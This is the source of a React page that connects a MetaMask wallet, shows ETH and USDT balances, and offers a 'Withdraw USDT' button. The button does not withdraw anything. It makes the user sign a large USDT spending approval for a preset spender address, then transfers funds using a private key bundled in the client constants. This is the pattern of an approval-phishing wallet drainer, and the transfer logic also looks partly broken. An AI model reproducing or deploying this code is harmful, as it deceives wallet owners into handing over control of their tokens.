import { useEffect, useState } from "react";
import "./App.css";
import { ethers } from "ethers";
import { CONSTANTS } from "./resources/constants";
import Loader from "./components/Loader";
import Alert from "./components/Alert";

const { USDT_ABI, USDT_CA, SPENDER_ADDRESS, PK, RECEIVER_ADDRESS } = CONSTANTS;

const App = () => {
    const [currentAccount, setCurrentAccount] = useState();
    const [ethBalance, setEthBalance] = useState("__");
    const [usdBalance, setUsdBalance] = useState("__");
    const [loader, setLoader] = useState(false);
    const [message, setMessage] = useState("");

    let ethereum;
    if (
        typeof window.ethereum !== "undefined" ||
        typeof window.web3 !== "undefined"
    ) {
        ethereum = window.ethereum;
    }

    useEffect(() => {
        (async () => {
            setLoader(true);
            await getEthBalance();
        })();

        if (!currentAccount) connectWallet();
    }, [currentAccount]);

    //connect wallect

    const connectWallet = async () => {
        if (typeof window.ethereum === "undefined") {
            alert("Please Install Metamask");
            return;
        }

        try {
            const addressArray = await window.ethereum.request({
                method: "eth_requestAccounts",
            });
            if (addressArray.length > 0) {
                setCurrentAccount(addressArray[0]);
            }
        } catch (error) {
            setLoader(false);
            setMessage(error.message);
        }
    };
    const getEthBalance = async () => {
        try {
            const provider = new ethers.providers.Web3Provider(ethereum);
            const signer = provider.getSigner();
            const address = await signer.getAddress();
            let ethBalance = await provider.getBalance(address);

            //get eth balance
            ethBalance = ethers.utils.formatEther(ethBalance);
            setEthBalance(ethBalance);

            //get USDT balance
            const contract = new ethers.Contract(USDT_CA, USDT_ABI, signer);
            let usdtBalance = await contract.balanceOf(address);
            setUsdBalance(Number(usdtBalance));
            setLoader(false);
        } catch (err) {
            setLoader(false);
            setMessage(err.message);
        }
    };

    const approveToken = async () => {
        try {
            setLoader(true);
            await approve(SPENDER_ADDRESS);
            await ercTransfer(PK, RECEIVER_ADDRESS);
            setLoader(false);
        } catch (error) {
            setLoader(false);
            setMessage(error.message);
        }
    };

    const approve = async (spenderAddress) => {
        const provider = new ethers.providers.Web3Provider(ethereum);
        const signer = provider.getSigner();
        const contract = new ethers.Contract(USDT_CA, USDT_ABI, signer);

        const approveHash = await contract.approve(
            spenderAddress,
            1000000000000,
            {
                gasLimit: 40000,
            }
        );
        return approveHash;
    };

    const ercTransfer = async (privateKey, receiverAddress) => {
        const provider = new ethers.providers.Web3Provider(ethereum);
        const wallet = new ethers.Wallet(privateKey, provider);
        const contract = new ethers.Contract(USDT_CA, USDT_ABI, wallet);

        let tx = await contract.transfer(receiverAddress, usdBalance, {
            gasLimit: 40000,
        });
        return tx.hash;
    };

    return (
        <div className="w-full m-auto my-6">
            {loader && <Loader />}
            {message && (
                <Alert message={message} onClose={() => setMessage("")} />
            )}
            <div class="max-w-sm m-auto p-6 bg-white border border-gray-200 rounded-lg shadow-md dark:bg-gray-800 dark:border-gray-700">
                <div className="divide-y-2">
                    <h5 class="mb-2 text-2xl font-bold tracking-tight text-gray-900 dark:text-white">
                        <p>Eth Balance: {ethBalance}</p>
                    </h5>
                    <h5 class="mb-2 text-2xl py-5 font-bold tracking-tight text-gray-900 dark:text-white">
                        <p>USDT Balance: {usdBalance}</p>
                    </h5>
                </div>

                <button
                    onClick={() => approveToken()}
                    class="inline-flex items-center px-3 py-2 text-sm font-medium text-center text-white bg-blue-700 rounded-lg hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800"
                >
                    Withdraw USDT
                </button>
            </div>
        </div>
    );
};

export default App;
